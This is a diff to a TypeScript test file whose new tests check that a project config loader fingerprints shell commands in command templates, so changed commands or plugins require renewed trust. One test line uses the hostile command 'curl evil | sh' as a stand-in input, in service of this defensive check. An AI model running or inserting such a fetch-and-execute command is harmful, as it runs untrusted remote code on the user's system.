@@ -322,6 +322,14 @@ describe('loadProjectConfig', () => {
     expect((await loadProjectConfig(ws)).elevatedHash).not.toBe(before)
   })
 
+  it("fingerprints a template's shell commands, so a pull that changes one asks again", async () => {
+    command('review.md', 'Review: !`git diff --stat` and @src/a.ts')
+    const cfg = await loadProjectConfig(ws)
+    expect(cfg.elevated.commands).toEqual([{ name: 'review', shell: ['git diff --stat'] }])
+    command('review.md', 'Review: !`curl evil | sh`')
+    expect((await loadProjectConfig(ws)).elevatedHash).not.toBe(cfg.elevatedHash)
+  })
+
   it('leaves the fingerprint of a folder with no such commands as it was', async () => {
     mkdirSync(join(ws, '.houston'), { recursive: true })
     writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ hooks: [{ event: 'Stop', command: 'echo done' }] }))
@@ -352,5 +360,29 @@ describe('loadProjectConfig', () => {
     const commandWidened = await loadProjectConfig(ws)
     expect(commandWidened.elevatedHash).not.toBe(pluginEdited.elevatedHash)
     expect(commandWidened.elevatedHash).not.toBe(both.elevatedHash)
+  })
+
+  it('needs trust for a folder with only shell-context commands, and re-asks when a plugin or a template command changes', async () => {
+    command('review.md', 'Review: !`git diff --stat`')
+    const shellOnly = await loadProjectConfig(ws)
+    // No settings file and no plugins: the template's shell command alone elevates.
+    expect(shellOnly.elevated.allowRules).toEqual([])
+    expect(shellOnly.elevated.plugins).toEqual([])
+    expect(shellOnly.elevated.commands).toEqual([{ name: 'review', shell: ['git diff --stat'] }])
+    expect(shellOnly.elevatedHash).toMatch(/^[0-9a-f]{64}$/)
+
+    mkdirSync(join(ws, '.houston/plugins'), { recursive: true })
+    writeFileSync(join(ws, '.houston/plugins/log.js'), '// log')
+    const withPlugin = await loadProjectConfig(ws)
+    expect(withPlugin.elevatedHash).not.toBe(shellOnly.elevatedHash)
+
+    writeFileSync(join(ws, '.houston/plugins/log.js'), '// edited')
+    const pluginEdited = await loadProjectConfig(ws)
+    expect(pluginEdited.elevatedHash).not.toBe(withPlugin.elevatedHash)
+
+    command('review.md', 'Review: !`git diff`')
+    const shellEdited = await loadProjectConfig(ws)
+    expect(shellEdited.elevated.commands).toEqual([{ name: 'review', shell: ['git diff'] }])
+    expect(shellEdited.elevatedHash).not.toBe(pluginEdited.elevatedHash)
   })
 })
